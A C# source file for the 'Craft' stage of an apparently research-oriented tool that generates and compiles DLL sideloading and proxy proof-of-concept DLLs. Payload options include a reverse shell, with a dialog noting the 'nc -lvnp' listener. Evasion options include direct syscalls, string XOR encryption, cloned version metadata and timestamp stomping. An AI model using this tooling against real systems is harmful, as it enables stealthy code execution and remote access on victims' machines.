using System.IO;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using DllSidecar.Core.Configuration;
using DllSidecar.Core.Logging;
using DllSidecar.Core.Models;
using DllSidecar.Core.Models.Wizard;
using DllSidecar.Core.Services;

namespace DllSidecar.GUI.Views.Wizard.Stages;

public partial class CraftStage : System.Windows.Controls.UserControl, IWizardStage
{
    private readonly WizardSession _session;
    private readonly WizardPage _shell;
    private PeAnalysis? _target;
    private bool _isPhantom;
    private bool _suppressArchToggle;

    private string? _deployDir;
    private string? _deployName;
    private string? _hostExePath;
    private bool _suppressPersist;
    private string? _systemOrigPath;

    // AppPaths handles dev-vs-installed path resolution — see GeneratePage's
    // identical refactor for the rationale.

    // Same sentinel as GeneratePage — first item in the export combo, selected by
    // default. When chosen, TargetExport stays null → template emits pure forwarder
    // (no trampolines, payload fires from DllMain).
    private const string NoHookSentinel = "(no hook — pure forwarder, payload from DllMain)";

    public CraftStage(WizardSession session, WizardPage shell)
    {
        _session = session;
        _shell = shell;
        InitializeComponent();

        PopulateXorKeys();
        ResolveTarget();
        PopulateFromAnalysis();
        SelectDefaultMode();
        UpdateModeTiles();
        UpdateHeader();
        SeedDeployBanner();

        // Restore any previously typed/selected inputs from the wizard session
        // (survives Back → Continue navigation AND app restart via WizardSessionStore).
        RestoreSessionInputs();
        WirePersistence();
    }

    /// <summary>
    /// Override the per-construction defaults (derived from candidate / importer) with
    /// whatever the user typed on a previous visit to this stage. Called after the
    /// defaults are in place so the session values always win.
    /// </summary>
    private void RestoreSessionInputs()
    {
        _suppressPersist = true;
        try
        {
            // Host path — the user's edit must outlive Back/Continue.
            if (!string.IsNullOrEmpty(_session.CraftHostExePath))
            {
                _hostExePath = _session.CraftHostExePath;
                HostExeBox.Text = _session.CraftHostExePath;
            }

            // Arch override
            if (_session.CraftArchOverride == "x86") ArchX86.IsChecked = true;
            else if (_session.CraftArchOverride == "x64") ArchX64.IsChecked = true;

            if (_session.CraftPayloadIndex >= 0 && _session.CraftPayloadIndex < PayloadCombo.Items.Count)
                PayloadCombo.SelectedIndex = _session.CraftPayloadIndex;
            if (!string.IsNullOrEmpty(_session.CraftPayloadData)) PayloadDataBox.Text = _session.CraftPayloadData;
            if (!string.IsNullOrEmpty(_session.CraftSandboxTargets)) SandboxTargetsBox.Text = _session.CraftSandboxTargets;

            if (_session.CraftThreadModeIndex >= 0 && _session.CraftThreadModeIndex < ThreadCombo.Items.Count)
                ThreadCombo.SelectedIndex = _session.CraftThreadModeIndex;

            ChkDInvoke.IsChecked = _session.CraftDInvoke;
            ChkSyscalls.IsChecked = _session.CraftSyscalls;
            ChkEncrypt.IsChecked = _session.CraftEncryptStrings;
            DelayBox.Text = _session.CraftEntryDelayMs.ToString();
            if (_session.CraftXorKeyIndex >= 0 && _session.CraftXorKeyIndex < XorKeyCombo.Items.Count)
                XorKeyCombo.SelectedIndex = _session.CraftXorKeyIndex;

            ChkCloneMeta.IsChecked = _session.CraftCloneMeta;
            ChkStomp.IsChecked = _session.CraftTimestampStomp;
            ChkAutoBuild.IsChecked = _session.CraftAutoBuild;

            ChkWriteProof.IsChecked = _session.CraftWriteProof;
            PreLaunchDelayBox.Text = _session.CraftPreLaunchDelaySec.ToString();
            if (_session.CraftWaitBlock) WaitBlock.IsChecked = true; else WaitFire.IsChecked = true;
            FireTimeoutBox.Text = _session.CraftFireTimeoutSec.ToString();
        }
        finally { _suppressPersist = false; }
    }

    private void PersistToSession()
    {
        if (_suppressPersist) return;
        _session.CraftHostExePath = HostExeBox.Text?.Trim();
        if (ArchX86.IsChecked == true) _session.CraftArchOverride = "x86";
        else if (ArchX64.IsChecked == true) _session.CraftArchOverride = "x64";

        _session.CraftPayloadIndex = PayloadCombo.SelectedIndex;
        _session.CraftPayloadData = PayloadDataBox.Text;
        _session.CraftSandboxTargets = SandboxTargetsBox.Text;
        _session.CraftThreadModeIndex = ThreadCombo.SelectedIndex;

        _session.CraftDInvoke = ChkDInvoke.IsChecked == true;
        _session.CraftSyscalls = ChkSyscalls.IsChecked == true;
        _session.CraftEncryptStrings = ChkEncrypt.IsChecked == true;
        if (int.TryParse(DelayBox.Text, out var ms)) _session.CraftEntryDelayMs = ms;
        _session.CraftXorKeyIndex = XorKeyCombo.SelectedIndex;

        _session.CraftCloneMeta = ChkCloneMeta.IsChecked == true;
        _session.CraftTimestampStomp = ChkStomp.IsChecked == true;
        _session.CraftAutoBuild = ChkAutoBuild.IsChecked == true;

        _session.CraftWriteProof = ChkWriteProof.IsChecked == true;
        if (int.TryParse(PreLaunchDelayBox.Text, out var pld)) _session.CraftPreLaunchDelaySec = pld;
        _session.CraftWaitBlock = WaitBlock.IsChecked == true;
        if (int.TryParse(FireTimeoutBox.Text, out var ft)) _session.CraftFireTimeoutSec = ft;

        _shell.RefreshChrome(); // triggers WizardSessionStore.Save so disk snapshot matches
    }

    private void WirePersistence()
    {
        void OnChanged(object? _, object __) => PersistToSession();

        HostExeBox.TextChanged += OnChanged;
        ArchX86.Checked += OnChanged; ArchX64.Checked += OnChanged;

        PayloadCombo.SelectionChanged += OnChanged;
        PayloadDataBox.TextChanged += OnChanged;
        SandboxTargetsBox.TextChanged += OnChanged;
        ThreadCombo.SelectionChanged += OnChanged;

        ChkDInvoke.Checked += OnChanged; ChkDInvoke.Unchecked += OnChanged;
        ChkSyscalls.Checked += OnChanged; ChkSyscalls.Unchecked += OnChanged;
        ChkEncrypt.Checked += OnChanged; ChkEncrypt.Unchecked += OnChanged;
        DelayBox.TextChanged += OnChanged;
        XorKeyCombo.SelectionChanged += OnChanged;

        ChkCloneMeta.Checked += OnChanged; ChkCloneMeta.Unchecked += OnChanged;
        ChkStomp.Checked += OnChanged; ChkStomp.Unchecked += OnChanged;
        ChkAutoBuild.Checked += OnChanged; ChkAutoBuild.Unchecked += OnChanged;

        ChkWriteProof.Checked += OnChanged; ChkWriteProof.Unchecked += OnChanged;
        PreLaunchDelayBox.TextChanged += OnChanged;
        WaitBlock.Checked += OnChanged; WaitFire.Checked += OnChanged;
        FireTimeoutBox.TextChanged += OnChanged;
    }

    public bool CanSkip => false;

    public async Task<bool> ValidateAndCommit()
    {
        if (_target == null)
        {
            MessageBox.Show("No target resolved — go back to Pick.",
                "Wizard", MessageBoxButton.OK, MessageBoxImage.Warning);
            return false;
        }

        if (_session.CraftMode == GenerationMode.Proxy && _target.NamedExports == 0)
        {
            MessageBox.Show("Proxy requires named exports. Switch to Sideload.",
                "Wizard", MessageBoxButton.OK, MessageBoxImage.Warning);
            return false;
        }

        // Capture ALL UI values on the UI thread before jumping to a worker.
        int payloadIdx = PayloadCombo.SelectedIndex;
        string payloadData = PayloadDataBox.Text.Trim();
        int threadIdx = ThreadCombo.SelectedIndex;
        bool autoBuild = ChkAutoBuild.IsChecked == true;
        bool cloneMeta = ChkCloneMeta.IsChecked == true;
        bool stomp = ChkStomp.IsChecked == true;
        bool dinvoke = ChkDInvoke.IsChecked == true;
        bool syscalls = ChkSyscalls.IsChecked == true;
        bool encrypt = ChkEncrypt.IsChecked == true;
        bool writeProof = ChkWriteProof.IsChecked == true;
        bool waitBlock = WaitBlock.IsChecked == true;
        int.TryParse(DelayBox.Text, out int delayMs);
        int.TryParse(PreLaunchDelayBox.Text, out int preDelay);
        int.TryParse(FireTimeoutBox.Text, out int fireTimeout);

        // XOR key from configured preset
        var xorCfg = ConfigManager.Current.Xor;
        byte xorKey = xorCfg.DefaultKey;
        if (XorKeyCombo.SelectedIndex >= 0 && XorKeyCombo.SelectedIndex < xorCfg.PresetKeys.Count)
            xorKey = xorCfg.PresetKeys[XorKeyCombo.SelectedIndex];

        string? targetExport = null;
        if (_session.CraftMode == GenerationMode.Proxy
            && ExportCombo.SelectedItem is string expSel
            && expSel != NoHookSentinel)
            targetExport = expSel;
        _session.TargetExport = targetExport;

        string hostExe = HostExeBox.Text.Trim();
        string sandboxTargets = SandboxTargetsBox?.Text?.Trim() ?? "";

        _shell.ShowOverlay("Generating + building", $"Crafting {_session.CraftMode} for {_target.Filename}...");
        try
        {
            await Task.Run(() => GenerateAndBuild(
                payloadIdx, payloadData, threadIdx, autoBuild, cloneMeta, stomp,
                dinvoke, syscalls, encrypt, writeProof, waitBlock,
                delayMs, preDelay, fireTimeout, xorKey, targetExport, hostExe,
                sandboxTargets));
            StatusLine.Text = _session.BuiltDllPath != null
                ? $"Built: {_session.BuiltDllPath}"
                : $"Generated: {_session.GeneratedOutputDir} (compile disabled)";
            _shell.RefreshChrome();
            return true;
        }
        catch (Exception ex)
        {
            Log.Error("wizard.craft", "Generation failed", ex);
            MessageBox.Show($"Generation failed: {ex.Message}",
                "Wizard", MessageBoxButton.OK, MessageBoxImage.Error);
            return false;
        }
        finally { _shell.HideOverlay(); }
    }

    public Task OnSkip() => Task.CompletedTask;

    // ---------- Target resolution ----------

    private void ResolveTarget()
    {
        if (_session.ChosenExisting != null)
        {
            var ex = _session.ChosenExisting;
            _target = ex.Dll;
            _isPhantom = false;
            _deployDir = Path.GetDirectoryName(ex.Dll.Path);
            _deployName = ex.Dll.Filename;
            _hostExePath = ex.Importers.FirstOrDefault()?.ExePath;
            _systemOrigPath = null;
            return;
        }
        if (_session.ChosenPhantom == null) return;

        var p = _session.ChosenPhantom;

        // Arch by majority vote across importers (same logic as ScanPage).
        // Tie → x86 (many x64 apps have an x86 CEF/helper subprocess that is
        // the real sideload entry — Acrobat's AcroCEF.exe is the canonical case).
        int x86 = 0, x64 = 0;
        var archDebug = new List<string>();
        foreach (var imp in p.Importers)
        {
            string? a = null;
            try { a = PeAnalyzer.Analyze(imp.ExePath).Arch; } catch { }
            archDebug.Add($"{imp.ExeFilename}={a ?? "?"}");
            if (a == "x86") x86++;
            else if (a == "x64") x64++;
        }
        var arch = (x86 == 0 && x64 == 0) ? "x64" : (x86 >= x64 ? "x86" : "x64");
        Log.Info("wizard.craft.arch",
            $"Phantom '{p.DllName}' arch vote: x86={x86}, x64={x64} → {arch} · importers [{string.Join(", ", archDebug)}]");

        var resolved = SystemDllResolver.Resolve(p.DllName, arch);

        _target = new PeAnalysis
        {
            Path = Path.Combine(p.DirectoryPath, p.DllName),
            Filename = p.DllName,
            Arch = arch,
            IsDll = true,
            OriginalFilename = p.DllName,
            Exports = resolved?.Analysis.Exports ?? new List<ExportEntry>(),
            NamedExports = resolved?.Analysis.NamedExports ?? 0,
            OrdinalOnlyExports = resolved?.Analysis.OrdinalOnlyExports ?? 0,
        };
        _isPhantom = true;

        _deployDir = p.DirectoryPath;
        _deployName = p.DllName;
        _hostExePath = p.Importers.FirstOrDefault(i =>
        {
            try { return PeAnalyzer.Analyze(i.ExePath).Arch == arch; } catch { return false; }
        })?.ExePath ?? p.Importers.FirstOrDefault()?.ExePath;
        _systemOrigPath = resolved?.Path;
    }

    // ---------- UI seeding ----------

    private void PopulateFromAnalysis()
    {
        ExportCombo.Items.Clear();
        ExportCombo.Items.Add(NoHookSentinel);
        if (_target != null)
            foreach (var exp in _target.Exports) ExportCombo.Items.Add(exp.DisplayName);
        ExportCombo.SelectedIndex = 0;
    }

    private void PopulateXorKeys()
    {
        var cfg = ConfigManager.Current.Xor;
        XorKeyCombo.Items.Clear();
        foreach (var k in cfg.PresetKeys)
            XorKeyCombo.Items.Add($"0x{k:X2}");
        var idx = cfg.PresetKeys.IndexOf(cfg.DefaultKey);
        XorKeyCombo.SelectedIndex = idx >= 0 ? idx : 0;
    }

    private void SelectDefaultMode()
    {
        // Tracer is intentionally not selectable from the wizard — it lives on the
        // standalone GENERATE → Export Tracer page for reconnaissance flows. The
        // wizard restricts itself to the two PoC-final modes.
        if (_target == null || _target.NamedExports == 0)
            _session.CraftMode = GenerationMode.Sideload;
        else
            _session.CraftMode = GenerationMode.Proxy;
    }

    private void UpdateModeTiles()
    {
        TileProxy.BorderBrush    = _session.CraftMode == GenerationMode.Proxy    ? Phosphor() : Ring();
        TileSideload.BorderBrush = _session.CraftMode == GenerationMode.Sideload ? Phosphor() : Ring();

        TileProxy.IsEnabled    = _target != null && _target.NamedExports > 0;
        TileSideload.IsEnabled = _target != null;

        // If a previously-saved session selected Tracer, demote it to a sane wizard mode.
        if (_session.CraftMode == GenerationMode.Tracer)
            _session.CraftMode = TileProxy.IsEnabled ? GenerationMode.Proxy : GenerationMode.Sideload;

        bool isProxy = _session.CraftMode == GenerationMode.Proxy;
        bool isSideload = _session.CraftMode == GenerationMode.Sideload;
        ExportPanel.Visibility = isProxy ? Visibility.Visible : Visibility.Collapsed;
        ThreadPanel.Visibility = isProxy || isSideload ? Visibility.Visible : Visibility.Collapsed;
    }

    private void UpdateHeader()
    {
        if (_target == null) return;
        HeaderHint.Text = _isPhantom
            ? $"Target: {_target.Filename} (PHANTOM slot at {Path.GetDirectoryName(_target.Path)}). System exports resolved: {_target.NamedExports}."
            : $"Target: {_target.Filename} ({_target.NamedExports} named exports). Mode auto-selected.";
    }

    private void SeedDeployBanner()
    {
        if (_target == null) { DeployBanner.Visibility = Visibility.Collapsed; return; }

        _suppressArchToggle = true;
        if (_target.Arch == "x86") ArchX86.IsChecked = true;
        else ArchX64.IsChecked = true;
        _suppressArchToggle = false;

        ApplyArchCompatibilityRules(_target.Arch);
        HostExeBox.Text = _hostExePath ?? "";
        RefreshDropText();
        RenderAutoModeText();
        DeployBanner.Visibility = Visibility.Visible;
    }

    private void RefreshDropText()
    {
        if (_deployDir != null && _deployName != null)
            DeployDropText.Text = $"Drop → {_deployDir}\\{_deployName}";
        else
            DeployDropText.Text = "";
    }

    private void RenderAutoModeText()
    {
        if (_target == null) return;
        var mode = _target.Exports.Count > 0 ? GenerationMode.Proxy : GenerationMode.Sideload;
        var modeLabel = mode == GenerationMode.Proxy ? "Proxy (auto)" : "Sideload (auto)";
        var detail = mode == GenerationMode.Proxy
            ? $"Forwarding {_target.Exports.Count} exports via _orig.dll sourced from {_systemOrigPath ?? "(none)"}"
            : "No system match — DllMain-only stub";
        AutoModeText.Text = $"◆ Mode: {modeLabel}   ·   {detail}";
        AutoModeText.Visibility = Visibility.Visible;
    }

    private System.Windows.Media.Brush Phosphor() => (System.Windows.Media.Brush)FindResource("Phosphor");
    private System.Windows.Media.Brush Ring()     => (System.Windows.Media.Brush)FindResource("Ring");

    // ---------- Handlers ----------

    private void TileProxy_Click(object sender, RoutedEventArgs e)    { _session.CraftMode = GenerationMode.Proxy;    UpdateModeTiles(); }
    private void TileSideload_Click(object sender, RoutedEventArgs e) { _session.CraftMode = GenerationMode.Sideload; UpdateModeTiles(); }

    private void PayloadCombo_Changed(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (PayloadDataBox == null) return;
        PayloadDataBox.Visibility = PayloadCombo.SelectedIndex switch
        {
            1 or 2 or 3 => Visibility.Visible,
            _ => Visibility.Collapsed,
        };
        PayloadDataBox.Text = PayloadCombo.SelectedIndex switch
        {
            1 => "calc.exe",
            3 => "cmd.exe",
            _ => "",
        };
        if (SandboxTargetsPanel != null)
            SandboxTargetsPanel.Visibility = PayloadCombo.SelectedIndex == 3
                ? Visibility.Visible : Visibility.Collapsed;

        // ReverseShell-safe defaults — see GeneratePage for the same logic.
        // Winsock + CreateProcess under the DllMain loader lock deadlocks; the
        // new-thread mode runs do_payload after DllMain returns, and the proof
        // file leaves a breadcrumb when the listener side never hears anything.
        // _suppressPersist gates the user-facing dialog so it doesn't fire when
        // the session restore in the ctor flips the combo on page load.
        if (PayloadCombo.SelectedIndex == 4)
        {
            if (ThreadCombo != null) ThreadCombo.SelectedIndex = 1;
            if (ChkWriteProof != null) ChkWriteProof.IsChecked = true;
            if (!_suppressPersist) ShowReverseShellAdvisory();
        }
    }

    /// <summary>
    /// One-shot informational modal explaining the auto-applied defaults when
    /// the user picks ReverseShell in the wizard's Craft stage. Mirrors the
    /// non-wizard GeneratePage helper of the same name.
    /// </summary>
    private static void ShowReverseShellAdvisory()
    {
        MessageBox.Show(
            "Reverse shell selected — safe defaults applied:\n\n" +
            "  • Thread mode → New thread (CreateThread)\n" +
            "      Required: Winsock + CreateProcessA under the DllMain loader\n" +
            "      lock deadlocks the host. A separate thread runs do_payload()\n" +
            "      after DllMain returns.\n\n" +
            "  • Write proof file → ON\n" +
            "      Leaves %TEMP%\\dllsidecar_proof_<PID>.txt at payload entry so\n" +
            "      you can confirm execution even if the listener never sees a\n" +
            "      connection (firewall, missing nc -lvnp, AV block).\n\n" +
            "Host / port come from Configuration → Payload Defaults.\n" +
            "Don't forget the listener: nc -lvnp <port>  (or ncat).",
            "Reverse shell — defaults applied",
            MessageBoxButton.OK, MessageBoxImage.Information);
    }

    private void BrowseHost_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new OpenFileDialog
        {
            Filter = "Executables|*.exe|All files|*.*",
            Title = "Pick the host EXE to launch after deploy",
        };
        if (!string.IsNullOrWhiteSpace(HostExeBox.Text) && File.Exists(HostExeBox.Text))
            dlg.InitialDirectory = Path.GetDirectoryName(HostExeBox.Text);
        if (dlg.ShowDialog() == true) HostExeBox.Text = dlg.FileName;
    }

    private void HostExeBox_Changed(object sender, TextChangedEventArgs e)
    {
        // When the Host path points at an existing PE, pull vendor from its version info
        // (CompanyName normalized) into the session so ReportStage + Library get the right
        // vendor even for phantom-only advisories where the target DLL has no CompanyName.
        TryResolveHostVendor(HostExeBox.Text);
    }

    private void TryResolveHostVendor(string? hostPath)
    {
        // ResolveFromFile: Authenticode Subject CN → CompanyName → ProductName. The signed
        // cert CN is what really identifies the publisher ("Blizzard Entertainment, Inc.",
        // "Microsoft Corporation"), so it wins over the self-reported version-info CompanyName.
        var vendor = Core.Services.Advisory.VendorResolver.ResolveFromFile(hostPath ?? "");
        if (!string.IsNullOrWhiteSpace(vendor))
        {
            _session.Vendor = vendor;
            _shell.RefreshChrome();
        }
    }

    private void WaitStrategy_Changed(object sender, RoutedEventArgs e)
    {
        if (FireTimeoutRow == null) return;
        FireTimeoutRow.Visibility = WaitFire.IsChecked == true
            ? Visibility.Visible : Visibility.Collapsed;
    }

    private void ArchToggle_Changed(object sender, RoutedEventArgs e)
    {
        if (_suppressArchToggle || _target == null) return;
        var newArch = ArchX86.IsChecked == true ? "x86" : "x64";
        if (_target.Arch == newArch) return;

        // For phantom: re-resolve system DLL to align exports + orig source.
        // For existing DLL: just flip the arch flag (MinGW will refuse if it
        // really doesn't match but at least the toggle reflects the researcher's
        // intent).
        if (_isPhantom)
        {
            var resolved = SystemDllResolver.Resolve(_target.Filename, newArch);
            _target.Exports = resolved?.Analysis.Exports ?? new List<ExportEntry>();
            _target.NamedExports = resolved?.Analysis.NamedExports ?? 0;
            _target.OrdinalOnlyExports = resolved?.Analysis.OrdinalOnlyExports ?? 0;
            _systemOrigPath = resolved?.Path;
        }
        _target.Arch = newArch;

        PopulateFromAnalysis();
        SelectDefaultMode();
        UpdateModeTiles();
        UpdateHeader();
        RenderAutoModeText();
        ApplyArchCompatibilityRules(newArch);
    }

    /// <summary>
    /// On x86 direct syscalls are not benign — sc_init reads i686 ntdll prologues
    /// with the x64-assumed layout and corrupts g_sc. Hard-disable.
    /// </summary>
    private void ApplyArchCompatibilityRules(string arch)
    {
        if (ChkSyscalls == null) return;
        if (arch == "x86")
        {
            ChkSyscalls.IsChecked = false;
            ChkSyscalls.IsEnabled = false;
            ChkSyscalls.ToolTip = "Disabled — Direct syscalls require x64. On x86 sc_init corrupts global state, breaking the PoC.";
        }
        else
        {
            ChkSyscalls.IsEnabled = true;
            ChkSyscalls.ToolTip = "Resolve and call NT* APIs via SSN + syscall instruction instead of going through ntdll export addresses.";
        }
    }

    // ---------- Generation ----------

    /// <summary>Runs on worker thread. All UI values must be passed in as primitives.</summary>
    private void GenerateAndBuild(
        int payloadIdx, string payloadData, int threadIdx,
        bool autoBuild, bool cloneMeta, bool stomp,
        bool dinvoke, bool syscalls, bool encrypt, bool writeProof, bool waitBlock,
        int delayMs, int preDelay, int fireTimeout, byte xorKey,
        string? targetExport, string hostExe, string sandboxTargets)
    {
        if (_target == null) return;

        var config = new TemplateConfig
        {
            Mode = _session.CraftMode,
            Payload = (PayloadType)payloadIdx,
            PayloadData = payloadData,
            Thread = (ThreadMode)threadIdx,
            CloneMetadata = cloneMeta,
            StompTimestamps = stomp,
            DInvoke = dinvoke,
            DirectSyscalls = syscalls,
            EncryptStrings = encrypt,
            DelayMs = delayMs,
            XorKey = xorKey,
            TargetExport = targetExport,
            // Researcher attribution from the Configuration page (matches GeneratePage).
            Researcher = Core.Configuration.ConfigManager.Current.Researcher.Handle ?? "",

            WriteProofFile = writeProof,
            PreLaunchDelaySec = Math.Max(0, preDelay),
            WaitForHostExit = waitBlock,
            NonBlockingTimeoutSec = Math.Max(1, fireTimeout),

            DeployTargetDir = _deployDir,
            DeployTargetName = _deployName,
            HostExePath = string.IsNullOrWhiteSpace(hostExe) ? _hostExePath : hostExe,
            SystemOrigPath = _systemOrigPath,
        };
        if (!string.IsNullOrWhiteSpace(sandboxTargets))
            config.SandboxTargets = sandboxTargets;

        // Pick up MessageBox title/body from Config → Payload Defaults so the
        // wizard-generated PoCs use the user's customised popup text, not
        // TemplateConfig's hardcoded fallback.
        var payloadCfg = ConfigManager.Current.Payload;
        config.MessageBoxTitle = payloadCfg.MessageBoxTitle;
        config.MessageBoxBody = payloadCfg.MessageBoxBody;

        // ReverseShell endpoint — same source-of-truth as MessageBox text.
        config.ReverseShellHost = payloadCfg.ReverseShellHost;
        config.ReverseShellPort = payloadCfg.ReverseShellPort;

        var baseName = Path.GetFileNameWithoutExtension(_target.Filename);
        var modeLabel = _session.CraftMode.ToString().ToLowerInvariant();
        var outputDir = Path.Combine(AppPaths.OutputRoot, $"{baseName}_{modeLabel}");
        Directory.CreateDirectory(outputDir);

        var files = TemplateEngine.Generate(_target, config);

        var templatesDir = AppPaths.TemplatesDir;

        // Copy headers used by the evasion options — omitting these breaks the build.
        if (config.DInvoke && File.Exists(Path.Combine(templatesDir, "dinvoke.h")))
            File.Copy(Path.Combine(templatesDir, "dinvoke.h"), Path.Combine(outputDir, "dinvoke.h"), true);
        if (config.DirectSyscalls && File.Exists(Path.Combine(templatesDir, "syscalls.h")))
            File.Copy(Path.Combine(templatesDir, "syscalls.h"), Path.Combine(outputDir, "syscalls.h"), true);
        if (config.EncryptStrings && File.Exists(Path.Combine(templatesDir, "cryptor.h")))
            File.Copy(Path.Combine(templatesDir, "cryptor.h"), Path.Combine(outputDir, "cryptor.h"), true);

        foreach (var (name, content) in files)
            File.WriteAllText(Path.Combine(outputDir, name), content);

        // Clone metadata → version.rc (only when the source PE actually exists).
        // Phantoms skip silently — there's nothing to copy from.
        if (config.CloneMetadata && !_isPhantom && File.Exists(_target.Path))
        {
            try
            {
                var vinfo = PeAnalyzer.ExtractVersionInfo(_target.Path);
                if (vinfo.Count > 0)
                {
                    var rcContent = TemplateEngine.GenerateRcFile(vinfo, _target.Filename);
                    File.WriteAllText(Path.Combine(outputDir, "version.rc"), rcContent);
                }
            }
            catch (Exception ex) { Log.Warn("wizard.craft.meta", "Metadata extraction failed", ex); }
        }

        _session.GeneratedOutputDir = outputDir;

        if (!autoBuild) return;

        var cFile = files.Keys.First(k => k.EndsWith(".c"));
        var defFile = files.Keys.First(k => k.EndsWith(".def"));
        var dllOutput = Path.Combine(outputDir, _target.Filename);

        // Compile version.rc → version.res.o if we wrote one.
        var extraObjects = new List<string>();
        var rcFile = Path.Combine(outputDir, "version.rc");
        if (File.Exists(rcFile))
        {
            var resObj = Path.Combine(outputDir, "version.res.o");
            if (BuildSystem.CompileResourceAsync(rcFile, resObj, _target.Arch, null)
                    .GetAwaiter().GetResult())
                extraObjects.Add(resObj);
        }

        // ws2_32 needed when the reverse-shell payload's trace code calls
        // WSAGetLastError() directly (not through a GetProcAddress pointer).
        var extraLibs = config.Payload == Core.Models.PayloadType.ReverseShell
            ? new[] { "ws2_32" } : null;
        var result = BuildSystem.CompileDllAsync(
            Path.Combine(outputDir, cFile),
            Path.Combine(outputDir, defFile),
            dllOutput,
            _target.Arch,
            includeDirs: [templatesDir, outputDir],
            extraObjects: extraObjects.Count > 0 ? extraObjects : null,
            extraLibs: extraLibs,
            progress: null).GetAwaiter().GetResult();

        if (!result.Success)
            throw new InvalidOperationException($"Build failed: {result.Errors}");

        _session.BuiltDllPath = dllOutput;

        // Stomp only when the source file exists (phantoms have nothing to copy from).
        if (config.StompTimestamps && !_isPhantom && File.Exists(_target.Path))
        {
            try { BuildSystem.StompTimestamps(_target.Path, dllOutput); }
            catch (Exception ex) { Log.Warn("wizard.craft.stomp", "Timestamp stomp failed", ex); }
        }

        Log.Info("wizard.craft", $"Built: {dllOutput} ({result.OutputSize:N0} bytes)");
    }
}
